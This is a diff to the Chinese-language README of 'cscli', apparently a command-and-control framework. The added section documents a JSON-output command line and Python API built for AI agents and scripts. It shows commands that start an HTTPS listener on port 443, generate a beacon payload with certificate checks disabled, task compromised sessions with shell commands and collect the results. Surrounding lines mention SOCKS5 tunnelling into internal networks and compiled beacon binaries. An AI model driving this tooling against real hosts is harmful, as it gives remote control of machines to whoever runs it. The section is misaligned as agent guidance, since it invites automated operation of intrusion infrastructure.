@@ -190,6 +190,38 @@ cscli> results <session_id>
 | `sleep <sec>` | 默认 beacon 回连间隔 |
 | `help` / `quit` | 帮助 / 退出 |
 
+## 非交互式 CLI（AI / 脚本驱动）
+
+`cscli` 也可作为单发式、JSON 输出的驱动，供 Agent 或 CI 流水线使用——交互提示符里
+能做的一切都能一条命令驱动。每次调用是独立进程，通过数据目录共享状态
+（`CSCLI_DATA_DIR`，默认为 `<repo>/data`）；监听器由分离的后台守护进程持有。
+
+```bash
+# 启动监听器（--background 分离守护进程）
+cscli --server --https --host 0.0.0.0 --port 443 --name main \
+      --key MyS3cret-Passphrase --background
+#   -> {"ok":true,"daemon_pid":...,"listener":"https://0.0.0.0:443",...}
+
+# 生成客户端 payload
+cscli --payload --url https://h:443 --out beacon.py --key MyS3cret-Passphrase --no-verify
+
+# 列会话 / 下派任务并等待 / 导出结果（全部 JSON 输出）
+cscli --list
+cscli --task <session_id> "shell id" --wait --timeout 40
+cscli --results <session_id>
+```
+
+也可用 Python API 实现同样效果：
+```python
+from cs.server import TeamServer
+from cs.payload import write_payload
+srv = TeamServer(data_dir="data")
+lis, err = srv.start_https_listener("main","0.0.0.0",443, crypto_key=KEY)
+write_payload(f"https://h:443","beacon.py", key=KEY, no_verify=True)
+# ...
+srv.task(session_id, "shell id")
+```
+
 ## 持久化
 
 会话、任务与结果状态以 JSON 持久化在 `data/sessions.json`（可用 `CSCLI_DATA_DIR`
@@ -206,6 +238,7 @@ python3 test_operator.py # 完整操作端控制台驱动真实 beacon 端到端
 python3 test_tls.py      # HTTPS + AES-GCM 加密通道 + 模块 tasking
 python3 test_socks.py    # SOCKS5 穿透隧道到内网
 python3 test_compiled.py # PyInstaller 编译二进制端到端
+python3 test_cli_driver.py # 非交互式 CLI 驱动（server/payload/list/task/wait）
 ```
 
 ## 目录结构
